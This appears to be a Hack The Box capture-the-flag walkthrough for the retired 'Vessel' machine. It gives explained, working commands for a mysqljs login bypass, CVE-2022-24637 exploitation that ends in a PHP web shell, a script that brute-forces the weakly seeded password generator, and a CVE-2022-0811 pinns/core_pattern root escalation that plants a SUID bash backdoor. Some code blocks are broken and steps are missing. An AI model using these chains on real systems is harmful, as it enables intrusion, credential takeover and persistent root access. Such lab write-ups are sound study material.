<h2 id="the-hacker-mindset">The Hacker Mindset</h2>
<p>Before we start — the goal of every HTB machine is to think like an attacker. Every service is an attack surface. Every piece of software has a version. Every version has a history of vulnerabilities. Every developer makes mistakes. Our job is to find those mistakes and chain them together from the outside all the way to root.</p>
<hr />
<h2 id="stage-1-reconnaissance">Stage 1 — Reconnaissance</h2>
<h3 id="step-1-port-scan-with-nmap">Step 1: Port Scan with Nmap</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.225
</code></pre>
<p><strong>Why:</strong> Before you touch anything, you need to know what's listening. <code>-p-</code> scans all 65535 ports (not just the top 1000 that nmap defaults to). <code>--min-rate 10000</code> speeds it up so we're not waiting forever. This is the first thing every attacker does — map the attack surface.</p>
<p><strong>Result:</strong> Ports 22 (SSH) and 80 (HTTP) are open.</p>
<h3 id="step-2-service-version-scan">Step 2: Service Version Scan</h3>
<pre><code class="language-bash" data-language="bash">nmap -p 22,80 -sCV 10.129.227.225
</code></pre>
<p><strong>Why:</strong> Now that we know which ports are open, we do a deeper scan. <code>-sC</code> runs default scripts (banner grabbing, basic enumeration), <code>-sV</code> detects service versions. Versions matter enormously — an old Apache version might be vulnerable to a known CVE.</p>
<p><strong>Result:</strong></p>
<ul>
<li>Port 22: OpenSSH 8.2p1 (Ubuntu 20.04)</li>
<li>Port 80: Apache 2.4.41</li>
</ul>
<p>The OpenSSH version tells us this is likely Ubuntu 20.04 Focal. We note this for later (privilege escalation techniques vary by OS version).</p>
<h3 id="step-3-add-domain-to-etc-hosts">Step 3: Add Domain to /etc/hosts</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.227.225 vessel.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why:</strong> Web applications often use virtual hosting — the same IP serves different content based on the <code>Host:</code> HTTP header. By adding the domain, our browser/curl will send the right Host header and get the intended site. This also enables subdomain enumeration later.</p>

<h2 id="stage-2-web-enumeration">Stage 2 — Web Enumeration</h2>

</code></pre>
<p><strong>Why:</strong> Developers sometimes push code to production servers with the <code>.git</code> directory still present. This is a goldmine — it contains the entire version history, credentials, and source code. The <code>.git/config</code> file is the first thing to check because it reveals if the repo is there without needing a directory listing.</p>
<p><strong>Result:</strong> The git config reveals developer name <code>Ethan</code> and email <code>ethan@vessel.htb</code>. Usernames are valuable — they can be SSH users, web app users, or give us clues about credentials.</p>
<h3 id="step-5-dump-the-git-repository">Step 5: Dump the Git Repository</h3>
<pre><code class="language-bash" data-language="bash">git-dumper http://vessel.htb/dev ~/Downloads/htb/git
</code></pre>
<p><strong>Why:</strong> <code>git-dumper</code> is a tool that reconstructs a git repository from a web server even when directory listing is disabled. It does this by fetching known git internal files (HEAD, index, pack files, objects) and piecing the repo back together. Once we have the source code, we can audit it for vulnerabilities far more efficiently than black-box testing.</p>
<h3 id="step-6-analyze-the-source-code">Step 6: Analyze the Source Code</h3>
<pre><code class="language-bash" data-language="bash">cd ~/Downloads/htb/git &amp;&amp; git log --oneline &amp;&amp; cat routes/index.js
</code></pre>
<p><strong>Why:</strong> Reading the git log tells us the history of changes. Commit messages like "Security Fixes" are a red flag — they mean there WAS a vulnerability, and we want to see both the old and new code. Reading <code>git diff</code> between commits shows exactly what was "fixed" and helps us understand the developer's intent.</p>
<p><strong>Key finding in routes/index.js:</strong></p>
<pre><code class="language-javascript" data-language="javascript">connection.query('SELECT * FROM accounts WHERE username = ? AND password = REDACTED,
    [username, password], function(error, results, fields) {
</code></pre>
<p>The developer switched to parameterized queries (the <code>?</code> placeholders) to fix SQL injection. This looks secure at first glance. But — they're using the <code>mysqljs</code> library, which has a known type confusion vulnerability.</p>

<h2 id="stage-3-authentication-bypass">Stage 3 — Authentication Bypass</h2>
<h3 id="step-7-exploit-mysqljs-type-confusion">Step 7: Exploit mysqljs Type Confusion</h3>
<pre><code class="language-bash" data-language="bash">curl -s -i -X POST http://vessel.htb/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&amp;password[password]=1" \
  -c /tmp/vessel_cookies.txt
</code></pre>
<p><strong>Why this works:</strong> The <code>mysqljs</code> library is supposed to safely escape the <code>?</code> parameters. But when you pass an <strong>object</strong> instead of a string as a parameter, it behaves unexpectedly. The query becomes:</p>
<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND password = REDACTED = 1
</code></pre>
<p>In MySQL, this evaluates as:</p>
<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND (password = REDACTED) = 1
</code></pre>
<p><code>password = REDACTED</code> is always true, so it becomes:</p>
<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND 1 = 1
</code></pre>
<p>Which returns the admin row, granting access. The lesson: <strong>parameterized queries are only safe if the library correctly handles all input types</strong>. Object injection into query parameters is a subtle but real vulnerability.</p>
<p><strong>Hacker mindset:</strong> When you see "Security Fixes" in git history, always check if the fix is complete. Developers often fix the obvious issue but miss edge cases.</p>
<p><strong>Result:</strong> HTTP 302 redirect to <code>/admin</code> — we're logged in.</p>

<h2 id="stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce">Stage 4 — CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)</h2>
<h3 id="step-9-identify-owa-version">Step 9: Identify OWA Version</h3>
<pre><code class="language-bash" data-language="bash">curl -s -L "http://openwebanalytics.vessel.htb/" | grep -i "version"
</code></pre>
<p><strong>Result:</strong> OWA version <strong>1.7.3</strong></p>
<p><strong>Why version matters:</strong> OWA 1.7.3 was released in November 2021. The next version (1.7.4, February 2022) contained a "CRITICAL SECURITY FIX". This tells us 1.7.3 is vulnerable. Always check the version against known CVEs — this is CVE-2022-24637.</p>
<h3 id="step-10-understand-cve-2022-24637">Step 10: Understand CVE-2022-24637</h3>
<p>This CVE has two parts:</p>
<p><strong>Part 1 — Information Disclosure:</strong> OWA caches PHP objects to disk for performance. These cache files are stored in <code>owa-data/caches/</code> which is <strong>publicly accessible without authentication</strong>. The cache files are meant to be PHP files, but a bug in the caching code writes <code>&lt;?php\n</code> with a literal <code>\n</code> instead of a real newline, breaking the PHP tag. The file is served as plain text instead of being executed — so its contents are readable.</p>
<p>The cache file for a user contains the <strong>serialized user object</strong>, including the <code>temp_passkey</code> field — a token used for password resets.</p>
<p><strong>Part 2 — Mass Assignment → Log Poisoning → RCE:</strong> The OWA settings endpoint doesn't whitelist which configuration keys can be updated. By sending arbitrary <code>owa_config[key]</code> parameters, we can set hidden config options like <code>error_log_file</code> (change the log path to a <code>.php</code> file) and then write PHP code into that log file.</p>
<h3 id="step-11-trigger-password-reset-to-generate-cache">Step 11: Trigger Password Reset to Generate Cache</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST "http://openwebanalytics.vessel.htb/index.php" \
  -d "owa_action=base.passwordResetRequest&amp;owa_email_address=admin@vessel.htb&amp;owa_submit=Request+New+Password"
</code></pre>
<p><strong>Why:</strong> A failed login also generates a cache, but the <code>temp_passkey</code> from a failed login isn't written to the database — so it can't be used to change the password. The password reset action (<code>base.passwordResetRequest</code>) <strong>generates a new temp_passkey AND writes it to the database</strong>, making it valid for the password change endpoint.</p>
<p><strong>Why <code>admin@vessel.htb</code> exists:</strong> We can confirm valid emails via the OWA "Forgot Password" form — it shows different responses for valid vs invalid emails. <code>admin@vessel.htb</code> returns success, confirming the account exists.</p>
<h3 id="step-12-fetch-the-cache-and-extract-temp-passkey">Step 12: Fetch the Cache and Extract temp_passkey</h3>
<p>The cache filename is predictable: <code>md5("user_id" + user_numeric_id)</code> where the admin's numeric ID is 1.</p>
<ul>
<li>Cache path: <code>/owa-data/caches/1/owa_user/[redacted retired-lab hash or flag].php</code>
(<code>[redacted retired-lab hash or flag]</code> = md5("id1"))</li>
</ul>
<pre><code class="language-python" data-language="python"># exploit script
curl cache → base64 decode → deserialize → extract temp_passkey
</code></pre>
<p><strong>Why the filename is predictable:</strong> We can trace through the OWA source code to find exactly how cache filenames are generated. The key is in <code>fileCache.php</code>: filename = <code>md5($col . $this-&gt;get('id'))</code>. For the password reset path, <code>$col</code> is "id" and <code>$this-&gt;get('id')</code> is 1.</p>
<h3 id="step-13-change-admin-password">Step 13: Change Admin Password</h3>
<pre><code class="language-bash" data-language="bash">curl -s -i -X POST "http://openwebanalytics.vessel.htb/index.php" \
  -d "owa_action=base.usersChangePassword&amp;owa_k=&lt;temp_passkey&gt;&amp;owa_password=hacked123&amp;owa_password2=hacked123"
</code></pre>
<p><strong>Why this works:</strong> The <code>base.usersChangePassword</code> action only checks that the supplied <code>owa_k</code> token matches a <code>temp_passkey</code> in the database. It doesn't verify email ownership, session state, or any other factor. If the token matches, the password is REDACTED This is the authentication flaw — we obtained the token from a publicly readable cache file.</p>
<p><strong>Result:</strong> HTTP 302 with <code>status_code=3006</code> = success. Admin password is REDACTED <code>hacked123</code>.</p>
<h3 id="step-14-log-in-and-get-rce">Step 14: Log in and Get RCE</h3>
<pre><code class="language-python" data-language="python"># 1. Login as admin
# 2. Get nonce from settings page
# 3. Set log file path to a .php file (mass assignment)
POST owa_config[base.error_log_level]=2

<p><strong>Why mass assignment works:</strong> OWA's <code>base.optionsUpdate</code> action loops over all <code>owa_config[*]</code> parameters and saves them to the configuration. There's no whitelist. So we can set internal config values that aren't exposed in the UI — including <code>error_log_file</code> (where OWA writes its debug log) and <code>error_log_level</code> (setting it to 2 makes OWA log all POST parameters).</p>
<p><strong>Why the log becomes executable PHP:</strong> We changed the log file path to end in <code>.php</code>. Apache will execute any <code>.php</code> file as PHP. When OWA logs our POST parameters (including <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code>), that PHP code lands in a <code>.php</code> file in a web-accessible directory. <h3 id="step-18-analyze-the-password-generator">Step 18: Analyze the Password Generator</h3>
<p>The <code>passwordGenerator</code> is a <strong>PyInstaller-bundled Windows executable</strong>. PyInstaller packages a Python interpreter and scripts into a single <code>.exe</code>. We can reverse this:</p>
<ol>
<li>Use <code>pyinstxtractor</code> to unpack the PyInstaller archive → extracts <code>.pyc</code> files</li>
<li>Use <code>uncompyle6</code> to decompile <code>.pyc</code> back to Python source</li>
</ol>
<p>The key function:</p>
<pre><code class="language-python" data-language="python">def genPassword(self):
    charset = '[redacted encoded lab material]~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
    qsrand(QTime.currentTime().msec())  # &lt;-- seed is milliseconds!
    password = REDACTED
    for i in range(32):
        idx = qrand() % len(charset)
        password += charset[idx]

</code></pre>
<p><strong>The vulnerability:</strong> <code>QTime.currentTime().msec()</code> returns the current millisecond (0–999). There are only <strong>1000 possible seeds</strong>. This means there are only <strong>1000 possible passwords</strong> the app can generate, regardless of how "random" they look.</p>
<h3 id="step-19-generate-the-password-wordlist">Step 19: Generate the Password Wordlist</h3>
<p><strong>Critical insight — platform difference:</strong> The <code>passwordGenerator.exe</code> is a Windows binary. Qt's <code>qrand()</code> on Windows wraps the MSVC C runtime's <code>rand()</code>, which uses a simple LCG (Linear Congruential Generator):</p>
<pre><code>state = (state * 214013 + 2531011) &amp; 0xFFFFFFFF
return (state &gt;&gt; 16) &amp; 0x7FFF   # RAND_MAX = 32767 on Windows
</code></pre>
<p>Linux's <code>glibc</code> uses a completely different (more complex) RNG. Using Linux's <code>rand()</code> via ctypes would generate <strong>wrong passwords</strong>. We must replicate the Windows MSVC algorithm exactly.</p>
<pre><code class="language-python" data-language="python">import ctypes
charset = '[redacted encoded lab material]~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'

def msvc_srand(seed):
    global state
    state = seed &amp; 0xFFFFFFFF

def msvc_rand():
    global state
    state = (state * 214013 + 2531011) &amp; 0xFFFFFFFF
    return (state &gt;&gt; 16) &amp; 0x7FFF

for seed in range(1000):
    msvc_srand(seed)
    pwd = REDACTED % len(charset)] for _ in range(32))
    passwords.add(pwd)
</code></pre>
<p>This generates 1000 unique passwords covering every possible output of the generator.</p>
<h3 id="step-20-crack-the-pdf">Step 20: Crack the PDF</h3>
<pre><code class="language-bash" data-language="bash">pdfcrack -f notes.pdf -w pass2.txt
</code></pre>
<p><strong>Why pdfcrack:</strong> The PDF uses standard password encryption (not a modern algorithm). pdfcrack tries each password in our wordlist against the PDF's encryption parameters.</p>
<p><strong>Result:</strong> <code>YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS</code></p>
<h3 id="step-21-read-the-pdf">Step 21: Read the PDF</h3>
<pre><code class="language-bash" data-language="bash">pdftotext -upw 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS' notes.pdf -
</code></pre>
<p><strong>Content:</strong></p>
<blockquote>
<p>Dear Steven, here is my password: null
— Ethan</p>
</blockquote>
<p><strong>Hacker mindset:</strong> People reuse passwords between systems. Ethan wrote his system password in a note to Steven. This is credential exposure through negligent documentation — a very common real-world finding.</p>
<h3 id="step-22-ssh-as-ethan-user-flag">Step 22: SSH as Ethan + User Flag</h3>
<pre><code class="language-bash" data-language="bash">ssh ethan@10.129.227.225  # password: null
cat ~/user.txt
</code></pre>

<h2 id="stage-6-privilege-escalation-to-root-cve-2022-0811">Stage 6 — Privilege Escalation to Root (CVE-2022-0811)</h2>
<h3 id="step-23-identify-the-attack-vector">Step 23: Identify the Attack Vector</h3>
<pre><code class="language-bash" data-language="bash">ls -la /usr/bin/pinns
find / -name runc 2&gt;/dev/null
</code></pre>
<p><strong>Result:</strong></p>
<ul>
<li><code>/usr/bin/pinns</code> — SUID binary owned by root, executable by group <code>ethan</code></li>
<li><code>/usr/sbin/runc</code> — container runtime present</li>
</ul>
<p><strong>What is pinns?</strong> <code>pinns</code> is a utility from <strong>CRI-O</strong> (a container runtime for Kubernetes). Its job is to "pin" Linux namespaces — create new namespaces and bind them to files so they persist after all processes in them exit. It also accepts a <code>-s</code> flag to set <strong>sysctl kernel parameters</strong> within those namespaces.</p>
<p><strong>CVE-2022-0811:</strong> Because <code>pinns</code> is SUID root, it runs as root. The <code>-s</code> parameter lets it set <strong>any sysctl</strong>, including <code>kernel.core_pattern</code>. On Linux, <code>kernel.core_pattern</code> defines what happens when a process crashes (core dump). If it starts with <code>|</code>, the kernel pipes the core dump to that program <strong>as root</strong>.</p>
<h3 id="step-24-understanding-the-full-exploit-chain">Step 24: Understanding the Full Exploit Chain</h3>
<p>The exploit requires two simultaneous actions:</p>
<ol>
<li><strong>Set <code>kernel.core_pattern</code></strong> to execute our payload (via pinns SUID)</li>
<li><strong>Trigger a crash inside a runc container</strong> which uses the compromised core_pattern</li>
</ol>
<p>Why inside a container? Because <code>runc</code> containers run with elevated privileges (even rootless containers operate differently than regular processes), and triggering a segfault inside causes the kernel to invoke the core_pattern handler as root in the host's context.</p>
<h3 id="step-25-set-up-the-runc-container-session-1">Step 25: Set Up the runc Container (Session 1)</h3>
<pre><code class="language-bash" data-language="bash">mkdir /tmp/meow &amp;&amp; cd /tmp/meow
runc spec --rootless    # generate default OCI container spec
mkdir rootfs            # empty root filesystem
</code></pre>
<p>Modify <code>config.json</code> to:</p>
<ul>
<li>Disable terminal (avoid <code>/dev/console</code> issues)</li>
<li>Bind mount <code>/</code> from host into container (so we can access host filesystem)</li>
<li>Bind mount <code>/dev</code> from host (so devices work)</li>
<li>Clear device creation list</li>
</ul>
<pre><code class="language-bash" data-language="bash">runc --root /tmp/meow run alpine
</code></pre>
<p>This drops us into a container shell running as root (container root, not host root).</p>
<h3 id="step-26-create-the-payload-session-2">Step 26: Create the Payload (Session 2)</h3>
<pre><code class="language-bash" data-language="bash">echo -e '#!/bin/sh\nchmod +s /usr/bin/bash' &gt; /home/ethan/e.sh
chmod +x /home/ethan/e.sh
</code></pre>
<p><strong>Why chmod +s on bash:</strong> Setting the SUID bit on <code>/usr/bin/bash</code> means any user can run <code>bash -p</code> and get an effective UID of root. This is a permanent privilege escalation backdoor.</p>
<p><strong>Why <code>/home/ethan/</code> not <code>/tmp/</code>:</strong> The server runs a cleanup cron job that deletes <code>*.sh</code> files from <code>/tmp</code>. Putting the script in ethan's home directory avoids this.</p>
<h3 id="step-27-hijack-kernel-core-pattern-session-2">Step 27: Hijack kernel.core_pattern (Session 2)</h3>
<pre><code class="language-bash" data-language="bash">pinns -d /var/run \
      -f 844aa3c8-2c60-4245-a7df-9e26768ff303 \
      -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #' \
      --ipc --net --uts --cgroup
</code></pre>
<p><strong>Breaking down the parameters:</strong></p>
<ul>
<li><code>-d /var/run</code> — directory to store namespace pin files</li>
<li><code>-f &lt;uuid&gt;</code> — filename for the namespace pin files (any valid UUID)</li>
<li><code>-s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #'</code> — sysctls to set. The <code>+</code> separates multiple sysctls. <code>kernel.core_pattern=|/home/ethan/e.sh #</code> sets the core dump handler to our script. The <code>#</code> at the end is a comment character that prevents any appended arguments from breaking the command.</li>
<li><code>--ipc --net --uts --cgroup</code> — namespace types to create/pin</li>
</ul>
<p><strong>Why this runs as root:</strong> <code>pinns</code> has the SUID bit set and is owned by root. When ethan runs it, the effective UID becomes root, and the sysctl write happens with root privileges. This is the exploit — a normal user can set <code>kernel.core_pattern</code> to an arbitrary path.</p>
<h3 id="step-28-trigger-core-dump-session-1-inside-container">Step 28: Trigger Core Dump (Session 1, inside container)</h3>
<pre><code class="language-bash" data-language="bash">ulimit -c unlimited    # enable core dumps
tail -f /dev/null &amp;    # background process to kill
kill -SIGSEGV %1       # send segfault signal → triggers core dump
</code></pre>
<p><strong>Why SIGSEGV:</strong> A segmentation fault (SIGSEGV) is one of the signals that triggers a core dump. When the process crashes, the kernel executes <code>kernel.core_pattern</code> — which is now our payload script — <strong>as root</strong>.</p>
<p>The payload runs: <code>chmod +s /usr/bin/bash</code> — setting the SUID bit.</p>
<h3 id="step-29-root-shell">Step 29: Root Shell</h3>
<pre><code class="language-bash" data-language="bash"># Session 2:
ls -la /usr/bin/bash    # verify -rwsr-sr-x (SUID bit set)
bash -p                 # -p preserves effective UID (root)
cat /root/root.txt
</code></pre>
<p><strong>Why <code>bash -p</code>:</strong> By default, bash drops privileges when it detects it's being run with an effective UID different from the real UID (a security feature). The <code>-p</code> flag disables this behavior, keeping the root effective UID.</p>
